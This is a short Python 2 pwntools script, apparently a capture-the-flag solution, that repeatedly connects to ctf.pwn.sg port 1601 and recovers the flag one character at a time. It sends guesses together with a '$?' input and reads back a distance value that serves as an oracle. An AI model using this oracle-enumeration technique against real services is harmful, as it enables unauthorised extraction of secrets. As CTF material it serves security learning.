#!/usr/bin/python2

import sys
from pwnlib.tubes.remote import remote

next_char = ""
flag = ""
test_char = 65

sys.stdout.write('[*] Enumerating characters: ')
sys.stdout.flush()

while next_char != '}':
    p = remote("ctf.pwn.sg", 1601)
    p.sendline(flag + chr(test_char))
    p.sendline("$?")

    dist = int(p.readline()[12:])
    next_char = chr((test_char + dist) % 256)
    flag += next_char

    sys.stdout.write('.')
    sys.stdout.flush()

sys.stdout.write('\n')
print '[*] The flag is:', flag
